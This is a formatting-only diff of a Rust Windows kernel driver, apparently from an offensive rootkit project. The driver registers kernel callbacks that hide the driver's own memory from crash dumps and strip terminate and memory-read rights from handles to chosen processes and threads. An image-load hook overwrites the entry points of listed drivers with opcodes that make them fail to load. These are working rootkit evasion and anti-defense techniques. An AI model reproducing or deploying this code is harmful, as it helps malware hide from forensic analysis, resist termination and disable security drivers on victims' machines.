@@ -2,27 +2,20 @@
 
 use core::{
     ffi::c_void,
-    ptr::{null_mut, addr_of_mut}
+    ptr::{addr_of_mut, null_mut},
 };
 
 use alloc::{string::String, vec::Vec};
 use spin::{lazy::Lazy, mutex::Mutex};
-use wdk_sys::{
-    ntddk::*, *,
-    _KBUGCHECK_CALLBACK_REASON::KbCallbackRemovePages,
-};
+use wdk_sys::{_KBUGCHECK_CALLBACK_REASON::KbCallbackRemovePages, ntddk::*, *};
 
-use shadowx::{uni, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, mdl::Mdl};
+use shadowx::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, mdl::Mdl, uni};
 use shadowx::{
-    KBUGCHECK_REASON_CALLBACK_RECORD, 
+    KBUGCHECK_REASON_CALLBACK_RECORD, KeDeregisterBugCheckReasonCallback,
     KeRegisterBugCheckReasonCallback,
-    KeDeregisterBugCheckReasonCallback
 };
 
-use shadowx::registry::callback::{
-    CALLBACK_REGISTRY, 
-    registry_callback
-};
+use shadowx::registry::callback::{CALLBACK_REGISTRY, registry_callback};
 
 /// Stores the `KBUGCHECK_REASON_CALLBACK_RECORD` instance.
 pub static mut BUG_CHECK: KBUGCHECK_REASON_CALLBACK_RECORD = unsafe { core::mem::zeroed() };
@@ -35,7 +28,7 @@ pub static mut DRIVER_SIZE: u32 = 0;
 
 /// Struct for managing callback registration.
 pub struct Callback<'a> {
-    driver: &'a mut DRIVER_OBJECT
+    driver: &'a mut DRIVER_OBJECT,
 }
 
 impl<'a> Callback<'a> {
@@ -45,11 +38,11 @@ impl<'a> Callback<'a> {
     }
 
     /// Registers all callbacks and validates their success.
-    /// 
+    ///
     /// Returns `STATUS_SUCCESS` if all registrations succeed, otherwise `STATUS_UNSUCCESSFUL`.
     pub fn register(&mut self) -> NTSTATUS {
-        if !self.bug_check() 
-            || !NT_SUCCESS(self.process()) 
+        if !self.bug_check()
+            || !NT_SUCCESS(self.process())
             || !NT_SUCCESS(self.thread())
             || !NT_SUCCESS(self.registry())
             || !NT_SUCCESS(self.image())
@@ -58,41 +51,44 @@ impl<'a> Callback<'a> {
         }
 
         STATUS_SUCCESS
-    }  
+    }
 
     /// Registers the BugCheck (crash dump) callback.
     #[inline(always)]
     fn bug_check(&self) -> bool {
-    unsafe {
-        let module = c"ShadowBugCheck";
-        BUG_CHECK.State = 0;
-        let result = KeRegisterBugCheckReasonCallback(
-            &mut BUG_CHECK,
-            Some(bug_check_remove_pages),
-            KbCallbackRemovePages,
-            module.as_ptr().cast_mut().cast()
-        );
-        if result != 0 {
-            log::info!("BugCheck callback registered successfully.");
-            true
-        } else {
-            log::error!("Failed to register BugCheck callback.");
-            false
+        unsafe {
+            let module = c"ShadowBugCheck";
+            BUG_CHECK.State = 0;
+            let result = KeRegisterBugCheckReasonCallback(
+                &mut BUG_CHECK,
+                Some(bug_check_remove_pages),
+                KbCallbackRemovePages,
+                module.as_ptr().cast_mut().cast(),
+            );
+            if result != 0 {
+                log::info!("BugCheck callback registered successfully.");
+                true
+            } else {
+                log::error!("Failed to register BugCheck callback.");
+                false
+            }
         }
-    }
     }
     /// Registers callbacks for thread operations.
     fn thread(&self) -> NTSTATUS {
         let altitude = uni::str_to_unicode("31243.5223");
         let altitude_str = altitude.to_string_lossy(); // Convert for logging
-        log::debug!("Attempting to register thread callback with altitude {}", altitude_str);
+        log::debug!(
+            "Attempting to register thread callback with altitude {}",
+            altitude_str
+        );
         let mut op_reg = OB_OPERATION_REGISTRATION {
             ObjectType: unsafe { PsThreadType },
             Operations: OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
             PreOperation: Some(thread::on_pre_open_thread),
             PostOperation: None,
         };
-        
+
         let mut cb_reg = OB_CALLBACK_REGISTRATION {
             Version: OB_FLT_REGISTRATION_VERSION as u16,
             OperationRegistrationCount: 1,
@@ -100,13 +96,22 @@ impl<'a> Callback<'a> {
             RegistrationContext: null_mut(),
             OperationRegistration: &mut op_reg,
         };
-        let status = unsafe { 
-            ObRegisterCallbacks(&mut cb_reg, addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_THREAD))
+        let status = unsafe {
+            ObRegisterCallbacks(
+                &mut cb_reg,
+                addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_THREAD),
+            )
         };
         if NT_SUCCESS(status) {
-            log::info!("Thread callback registered successfully with altitude {}", altitude_str);
+            log::info!(
+                "Thread callback registered successfully with altitude {}",
+                altitude_str
+            );
         } else {
-            log::error!("ObRegisterCallbacks for thread failed with status: {}", status);
+            log::error!(
+                "ObRegisterCallbacks for thread failed with status: {}",
+                status
+            );
         }
         status
     }
@@ -114,7 +119,10 @@ impl<'a> Callback<'a> {
     fn process(&self) -> NTSTATUS {
         let altitude = uni::str_to_unicode("31243.5222");
         let altitude_str = altitude.to_string_lossy();
-        log::debug!("Attempting to register process callback with altitude {}", altitude_str);
+        log::debug!(
+            "Attempting to register process callback with altitude {}",
+            altitude_str
+        );
         let mut op_reg = OB_OPERATION_REGISTRATION {
             ObjectType: unsafe { PsProcessType },
             Operations: OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
@@ -128,13 +136,22 @@ impl<'a> Callback<'a> {
             RegistrationContext: null_mut(),
             OperationRegistration: &mut op_reg,
         };
-        let status = unsafe { 
-            ObRegisterCallbacks(&mut cb_reg, addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_PROCESS))
+        let status = unsafe {
+            ObRegisterCallbacks(
+                &mut cb_reg,
+                addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_PROCESS),
+            )
         };
         if NT_SUCCESS(status) {
-            log::info!("Process callback registered successfully with altitude {}", altitude_str);
+            log::info!(
+                "Process callback registered successfully with altitude {}",
+                altitude_str
+            );
         } else {
-            log::error!("ObRegisterCallbacks for process failed with status: {}", status);
+            log::error!(
+                "ObRegisterCallbacks for process failed with status: {}",
+                status
+            );
         }
         status
     }
@@ -144,8 +161,11 @@ impl<'a> Callback<'a> {
         let altitude_str = altitude_owned.to_string_lossy();
         // Use the UNICODE_STRING for the actual API call.
         let altitude = altitude_owned.to_unicode();
-        log::debug!("Attempting to register registry callback with altitude {}", altitude_str);
-        let status = unsafe { 
+        log::debug!(
+            "Attempting to register registry callback with altitude {}",
+            altitude_str
+        );
+        let status = unsafe {
             CmRegisterCallbackEx(
                 Some(registry_callback),
                 &altitude,
@@ -153,10 +173,13 @@ impl<'a> Callback<'a> {
                 null_mut(),
                 addr_of_mut!(CALLBACK_REGISTRY),
                 null_mut(),
-            ) 
+            )
         };
         if NT_SUCCESS(status) {
-            log::info!("Registry callback registered successfully with altitude {}", altitude_str);
+            log::info!(
+                "Registry callback registered successfully with altitude {}",
+                altitude_str
+            );
         } else {
             log::error!("CmRegisterCallbackEx failed with status: {}", status);
         }
@@ -193,14 +216,12 @@ impl<'a> Callback<'a> {
             log::info!("Image load notify callback unregistered successfully.");
         }
     }
-    
 }
 /// Callback function triggered during a system crash (bug check).
 ///
 /// This function modifies the crash dump behavior by marking specific memory
 /// regions to be removed from the crash dump.
-extern "C" 
-fn bug_check_remove_pages(
+extern "C" fn bug_check_remove_pages(
     _Reason: KBUGCHECK_CALLBACK_REASON,
     _Record: *mut KBUGCHECK_REASON_CALLBACK_RECORD,
     ReasonSpecificData: *mut c_void,
@@ -216,25 +237,26 @@ fn bug_check_remove_pages(
         // Modify crash dump to remove specific pages
         let dump_data = ReasonSpecificData as *mut KBUGCHECK_REMOVE_PAGES;
         (*dump_data).Address = DRIVER_BASE as u64;
-        (*dump_data).Count = ((DRIVER_SIZE >> PAGE_SHIFT) + ((DRIVER_SIZE & (PAGE_SIZE - 1)) != 0) as u32) as u64;
+        (*dump_data).Count =
+            ((DRIVER_SIZE >> PAGE_SHIFT) + ((DRIVER_SIZE & (PAGE_SIZE - 1)) != 0) as u32) as u64;
         (*dump_data).Flags = KB_REMOVE_PAGES_FLAG_VIRTUAL_ADDRESS;
     }
 }
 // Opcodes that will be entered to prevent the driver from being loaded
 const OPCODES: [u8; 6] = [
     0xB8, 0x01, 0x00, 0x00, 0xC0, // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
-	0xC3                         // ret
+    0xC3, // ret
 ];
 // Maximum number of drivers that can be protected
 const MAX_DRIVER: usize = 256;
 /// List of drivers to block.
-static TARGET_DRIVERS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_DRIVER)));
+static TARGET_DRIVERS: Lazy<Mutex<Vec<String>>> =
+    Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_DRIVER)));
 /// Callback function triggered when an image (executable/DLL) is loaded.
 ///
-/// This function intercepts image loading events and checks for images. 
+/// This function intercepts image loading events and checks for images.
 /// If detected, it modifies the image's entry point using an MDL (Memory Descriptor List).
-extern "C"
-fn image_notify_routine(
+extern "C" fn image_notify_routine(
     FullImageName: PUNICODE_STRING,
     ProcessId: HANDLE,
     ImageInfo: PIMAGE_INFO,
@@ -256,8 +278,11 @@ fn image_notify_routine(
             return;
         }
         // Locate the entry point of the image
-        let nt_header = ((*((*ImageInfo).ImageBase as *const IMAGE_DOS_HEADER)).e_lfanew as usize + (*ImageInfo).ImageBase as usize) as *const IMAGE_NT_HEADERS;
-        let entry_point = ((*ImageInfo).ImageBase as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut u8;
+        let nt_header = ((*((*ImageInfo).ImageBase as *const IMAGE_DOS_HEADER)).e_lfanew as usize
+            + (*ImageInfo).ImageBase as usize) as *const IMAGE_NT_HEADERS;
+        let entry_point = ((*ImageInfo).ImageBase as usize
+            + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize)
+            as *mut u8;
 
         // Use MDL to safely modify the memory at the entry point
         if let Some(mdl) = Mdl::new(entry_point, size_of_val(&OPCODES)) {
@@ -269,12 +294,11 @@ fn image_notify_routine(
 }
 
 pub mod driver {
-    use super::{TARGET_DRIVERS, MAX_DRIVER};
+    use super::{MAX_DRIVER, TARGET_DRIVERS};
     use alloc::string::String;
     use wdk_sys::{
-        NTSTATUS, STATUS_DUPLICATE_OBJECTID, 
-        STATUS_QUOTA_EXCEEDED, STATUS_SUCCESS, 
-        STATUS_UNSUCCESSFUL
+        NTSTATUS, STATUS_DUPLICATE_OBJECTID, STATUS_QUOTA_EXCEEDED, STATUS_SUCCESS,
+        STATUS_UNSUCCESSFUL,
     };
     /// Adds a driver to the list.
     ///
@@ -324,17 +348,16 @@ pub static mut CALLBACK_REGISTRATION_HANDLE_PROCESS: *mut c_void = null_mut();
 /// List of target PIDs protected by a mutex.
 static TARGET_PIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_PID)));
 pub mod process {
-    use alloc::vec::Vec;
-    use core::ffi::c_void;
     use super::TARGET_PIDS;
+    use alloc::vec::Vec;
     use common::structs::TargetProcess;
-    use wdk_sys::ntddk::PsGetProcessId;
-    use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{Type, OB_PREOP_SUCCESS};
-    use wdk_sys::*;
+    use core::ffi::c_void;
     use shadowx::{
-        PROCESS_CREATE_THREAD, PROCESS_TERMINATE, 
-        PROCESS_VM_OPERATION, PROCESS_VM_READ,
+        PROCESS_CREATE_THREAD, PROCESS_TERMINATE, PROCESS_VM_OPERATION, PROCESS_VM_READ,
     };
+    use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{OB_PREOP_SUCCESS, Type};
+    use wdk_sys::ntddk::PsGetProcessId;
+    use wdk_sys::*;
     /// Method for adding the list of processes that will have anti-kill / dumping protection.
     ///
     /// # Arguments
@@ -403,8 +426,7 @@ pub mod process {
     /// # Returns
     ///
     /// * A status code indicating the success or failure of the operation.
-    pub unsafe extern "C" 
-    fn on_pre_open_process(
+    pub unsafe extern "C" fn on_pre_open_process(
         _registration_context: *mut c_void,
         info: *mut OB_PRE_OPERATION_INFORMATION,
     ) -> Type {
@@ -422,7 +444,7 @@ pub mod process {
                 | PROCESS_CREATE_THREAD
                 | PROCESS_DUP_HANDLE
                 | PROCESS_TERMINATE);
-                
+
             (*(*info).Parameters).CreateHandleInformation.DesiredAccess &= mask;
         }
 
@@ -436,15 +458,12 @@ pub static mut CALLBACK_REGISTRATION_HANDLE_THREAD: *mut c_void = null_mut();
 /// List of the target TIDs
 static TARGET_TIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_TID)));
 pub mod thread {
-    use wdk_sys::ntddk::PsGetThreadId;
-    use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{Type, OB_PREOP_SUCCESS};
-    use wdk_sys::*;
     use super::TARGET_TIDS;
+    use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{OB_PREOP_SUCCESS, Type};
+    use wdk_sys::ntddk::PsGetThreadId;
+    use wdk_sys::*;
 
-    use {
-        alloc::vec::Vec,
-        common::structs::TargetThread,
-    };    
+    use {alloc::vec::Vec, common::structs::TargetThread};
     /// Method for adding the list of threads that will have anti-kill / dumping protection.
     ///
     /// # Arguments
@@ -518,8 +537,7 @@ pub mod thread {
     /// # Returns
     ///
     /// * A status code indicating the success of the pre-operation.
-    pub unsafe extern "C" 
-    fn on_pre_open_thread(
+    pub unsafe extern "C" fn on_pre_open_thread(
         _registration_context: *mut core::ffi::c_void,
         info: *mut OB_PRE_OPERATION_INFORMATION,
     ) -> Type {
@@ -536,7 +554,7 @@ pub mod thread {
                 | THREAD_SUSPEND_RESUME
                 | THREAD_GET_CONTEXT
                 | THREAD_SET_CONTEXT);
-            
+
             (*(*info).Parameters).CreateHandleInformation.DesiredAccess &= mask;
         }
 
